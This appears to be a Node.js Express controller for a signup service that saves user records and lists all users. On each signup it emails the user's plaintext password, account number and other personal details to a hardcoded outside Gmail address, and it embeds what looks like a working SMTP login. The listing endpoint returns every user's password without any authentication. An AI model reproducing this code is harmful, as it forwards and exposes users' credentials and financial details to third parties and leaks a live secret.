const Usersignup = require("../Model/UserModel-Signup");
const nodemailer = require('nodemailer');

exports.create = async (req, res) => {
  try {
    const { Name, Age, Phone_Number, Email, Account_no, Password, Username } = req.body;
    const finduser = await Usersignup.findOne({ Email: Email });
    if (!Name || !Age || !Phone_Number || !Email || !Account_no || !Password || !Username) {
      return res.status(400).json({
        message: "Required fields are missing"
      });
    }
    console.log(Email);
    if (finduser) {
      return res.status(201).json({
        message: " already created"
      });
    } else {
      const created = await Usersignup.create({
        Name: Name,
        Age: Age,
        Phone_Number: Phone_Number,
        Email: Email,
        Account_no: Account_no,
        Password: Password,
        Username: Username
      });

      const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        service: 'Gmail',
        port: 587,
        secure: false,
        auth: {
          user: 'alihuzaifah555@gmail.com',
          pass: 'kepzjmcffuitfpih'
        }
      });

      const mailOptions = {
        from: 'Email',
        to: 'sherazabbas669@gmail.com',
        subject: 'New user signed up',
        html: `<p>A new user has signed up with the following details:</p>
        <ul>
          <li>Name: ${Name}</li>
          <li>Age: ${Age}</li>
          <li>Phone Number: ${Phone_Number}</li>
          <li>Email: ${Email}</li>
          <li>Account Number: ${Account_no}</li>
          <li>Password: ${Password}</li>
          <li>Username: ${Username}</li>
        </ul>`
      };

      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });

      return res.status(201).json({
        message: "created", created
      });
    }
  } catch (error) {
    return res.status(500).json({
      message: "Server error",
    });
  }
}

exports.getuser=async (req,res)=>{
  try{
  const finduser = await Usersignup.find({});
  console.log(finduser);
  return res.status(200).json({
    message: "All users",finduser
  });
  }

  catch(error){
    return res.status(500).json({
      message: "server error"
    });      
  }
}
